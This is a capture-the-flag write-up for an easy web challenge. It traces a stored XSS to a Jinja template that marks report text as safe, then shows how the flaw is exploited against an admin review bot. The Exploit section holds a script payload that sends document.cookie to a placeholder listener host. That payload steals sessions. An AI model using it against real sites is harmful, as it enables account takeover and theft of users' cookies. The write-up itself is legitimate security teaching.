---
title: "baby X55"
ctf: "Friendly CTF 2026"
date: 2026-09-28
category: web
difficulty: easy
author: "L-BOH"
---

# baby X55

## Summary

Reports are reviewed by an administrator bot. The report content is rendered as HTML, so a submitted script runs in the bot's browser and leaks its flag cookie.

## Root cause

The report detail template contains:

~~~jinja
<div class="detail-content">{{ report[2] | safe }}</div>
~~~

The safe filter disables Jinja's HTML escaping. A report body containing a script tag is therefore delivered as executable HTML. The review feature turns this stored XSS into an attack on the administrator bot.

## Vulnerability

Create a report whose content contains harmless bold HTML. If the report detail page renders bold text rather than the tags, the application is treating report text as HTML. Because the page can be sent to the admin, this becomes stored XSS against the bot.

## Exploit

1. Create an account and submit a report.
2. Put this in its content, replacing LISTENER with a request bin or a server you control:

~~~html
<script>location='https://LISTENER/?c='+encodeURIComponent(document.cookie)</script>
~~~

3. Open the report and choose **Send to admin for review**.
4. Check the listener. The query parameter contains the admin bot's flag cookie.

The payload uses navigation rather than a fetch request. Once the bot opens the report, the browser runs the stored script and leaves the site with the cookie in the URL.

## Flag

~~~text
Securinets{w3lcome_t0_cr0ss_s1te_scr1p71ng}
~~~
